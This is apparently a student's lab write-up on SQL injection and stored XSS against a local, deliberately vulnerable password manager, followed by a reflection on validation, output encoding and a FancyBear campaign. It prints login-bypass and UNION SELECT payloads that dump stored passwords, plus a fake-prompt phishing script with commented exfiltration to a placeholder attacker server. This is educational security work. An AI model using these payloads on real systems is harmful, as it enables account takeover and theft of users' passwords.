# W7 | Injection & XSS Testing

## Introduction  
Web applications live and die by how they handle user input—and in this lab, you’ll discover what happens when that input isn’t properly validated.

We’ll test two of the most common web vulnerabilities:
- **SQL Injection** which targets the database layer by manipulating queries
- **Cross-Site Scripting (XSS)** which injects malicious scripts into web pages

Using **OWASP ZAP** we’ll scan the app to find vulnerabilities then manually craft input to exploit them—altering data, injecting scripts, demonstrating risks of insecure input handling.

We’ll:
- Use **ZAP** to identify injection vulnerabilities
- Perform real SQLi and XSS attacks on a test system
- Learn how to prevent them through validation and sanitization

By the end, we’ll understand why **input handling** is one of the most critical aspects of web security and how to defend against these attacks in the wild.

## Steps
1. Download ZAP, enable configurations in computer settings to open. 
2. Select “Automated Scan”, enter password manager url https://localhost to begin attack.
3. In the top menu set view to “Reponses” and “Alerts” and let system run for 10 minutes.
4. Once a high alert (red flag) “SQL Injection” vulnerability is found, study the report to see which type of SQL injection can be used for the username in the login page.
**Log in as Admin without using their password**
5. Use the query ' and 0 in (select sleep(15) ) – and random password to bypass the login page.
6. Explore pages, and logout.
7. Login as the Admin without a password using a similar approach. Admin’ --#
8. Logout, login as “Username” with proper credentials.

**Find a way to retrieve all VAULT passwords from database**
9. Navigate to Vaults page.
10. In the search field input the following injection: ‘UNION SELECT username, password FROM vault_passwords-- -
11. Press enter to see all vault passwords load.

**Create false pop-up asking victim for confidential info whenever they access a vault**
12. Reload page to clear the search field.
13. Navigate to a vault, click on “Edit password”.
14. In the “Notes” field paste the JS payload that will create a fake popup asking for sensitive information.
<script>
    var phishing_prompt = prompt("Security Alert: For your protection, please re-enter your VAULT password.");
    if (phishing_prompt) {
        // In a real scenario, you would send 'phishing_prompt' to an attacker-controlled server.
        // For demonstration, we'll just show an alert with the entered data.
        alert("Captured data (for demo): " + phishing_prompt + "\n(In a real attack, this would be sent to the attacker.)");

        // To send it to an attacker server (similar to Task 2):
        // var attacker_server_url = 'https://YOUR_ATTACKER_SERVER_URL/log_phish'; 
        // new Image().src = attacker_server_url + '?phished_data=' + encodeURIComponent(phishing_prompt);
    }
</script>
15. Click “Update Password” to save and have a partner navigate to the vault to edit details. 
16. Tne JS embedded in the “Notes” field will popup automatically, asking for their vault password. 
17. If they enter information an alert box will show the captured data.

## Reflection
These attacks occurred due to improper input validation and output encoding. The **application is vulnerable** to SQL injection because user input like usernames and passwords (login.php), data added to vaults (vault_details.php) is **directly linked to SQL queries without being properly sanitized or parameterized**. The application treats user input as part of executable SQL code, allowing attackers to **inject malicious commands to alter the database**. Although it didn’t explicitly show in the ZAP alert log, in theory this application is also vulnerable to XSS shown by the pop up attack, where user given data is stored in the database without proper sanitization. When this stored data is later retrieved and displayed in the browser it fails to run adequate output encoding. The browser interprets the malicious embedded JS as executable code and runs the script.

The concepts that relate most to this lab are: **input validation, output encoding, POLP, defense in depth**. Input validation emphasizes that all user input should be validated and sanitized at the point of entry to ensure it obeys the expected formats, yet both SQL injection and XSS fail to implement robust input validation. Applying **Zero Trust, “never trust, always identify”**, data from untrusted sources(user inputs) should be properly encoded to confirm injected scripts are treated as data not active code. POLP decreases the attack surface by granting minimum access needed to perform tasks. This relates to when the Admin login was bypassed with queries, granting excessive privileges. Another way to **harden the password application is to implement multiple security controls**. If input validation fails, output coding could have served as a secondary defence against XSS.

**FancyBear**, a state sponsored Russian spy hacker group, was found targeting Ukraine related organizations since 2023 by **exploiting cross site scripting in vulnerable webmail servers(Roundcube). The attack injects malicious JS payloads into email messages**, so when victims like government entities open them the hidden JS executes. This allows attackers to steal confidential information(contacts, email content) leading to data theft and spying through client side code injection.
A similar XSS attack can be done on the password application by exploiting the stored XSS vulnerability in the vault details functionality. The vault_details.php file is susceptible because it directly stores user supplied input (Notes field) into the database without proper sanitization, and renders the content back into the user’s browser without output encoding. Like demonstrated above an attacker could inject a malicious JS payload into the password editor Notes field. When another user views that vault entry the injected script would execute in their browser, mirroring FancyBear’s method. This script could be used to capture the victim's session cookies (session hijacking) or extract sensitive information displayed to transmit it to an attacker server with the user unaware. This shows how unvalidated input and lack of output encoding can transform a harmless text box into a powerful attack point for extracting data and compromising accounts.
